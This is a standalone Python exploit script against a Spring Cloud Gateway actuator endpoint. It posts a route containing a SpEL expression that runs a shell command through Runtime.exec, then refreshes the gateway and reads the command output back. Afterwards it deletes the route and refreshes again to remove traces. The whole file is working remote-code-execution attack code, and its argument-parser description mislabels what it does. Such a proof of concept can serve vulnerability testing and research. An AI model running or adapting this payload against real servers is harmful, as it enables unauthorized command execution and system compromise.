import requests
import argparse

# Set up argument parsing
parser = argparse.ArgumentParser(description="Attempt to access sensitive files via various plugins.")
parser.add_argument('--host', type=str, default='localhost', help='Target host (default: localhost)')
parser.add_argument('--port', type=str, default='8983', help='Target port (default: 8983)')

args = parser.parse_args()

# Use arguments from CLI or default values
host = args.host
port = args.port

# Set up target information
target_host = f"http://{host}:{port}"
evil_route_id = "testing"
headers = {
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Accept-Language": "en",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Connection": "close",
    "Content-Type": "application/json"
}

# Step 1: Add the evil route with SpEL expression
add_route_payload = {
    "id": evil_route_id,
    "filters": [{
        "name": "AddResponseHeader",
        "args": {
            "name": "Result",
            "value": "#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}"
        }
    }],
    "uri": "http://example.com"
}
print("[*] Adding evil route...")
response = requests.post(f"{target_host}/actuator/gateway/routes/{evil_route_id}", json=add_route_payload, headers=headers)
print(f"[+] Response: {response.status_code}")

# Step 2: Refresh the gateway to execute the SpEL
refresh_headers = headers.copy()
refresh_headers["Content-Type"] = "application/x-www-form-urlencoded"

print("[*] Refreshing gateway to trigger SpEL...")
response = requests.post(f"{target_host}/actuator/gateway/refresh", headers=refresh_headers)
print(f"[+] Response: {response.status_code}")

# Step 3: Retrieve the result of the command execution
print("[*] Retrieving result of SpEL execution...")
response = requests.get(f"{target_host}/actuator/gateway/routes/{evil_route_id}", headers=headers)
print(f"[+] Response: {response.status_code}")
print(f"[+] Response Body: {response.text}")

# Step 4: Delete the evil route
print("[*] Deleting the evil route...")
response = requests.delete(f"{target_host}/actuator/gateway/routes/{evil_route_id}", headers=headers)
print(f"[+] Response: {response.status_code}")

# Step 5: Refresh the gateway again to clean up
print("[*] Refreshing gateway to finalize cleanup...")
response = requests.post(f"{target_host}/actuator/gateway/refresh", headers=refresh_headers)
print(f"[+] Response: {response.status_code}")
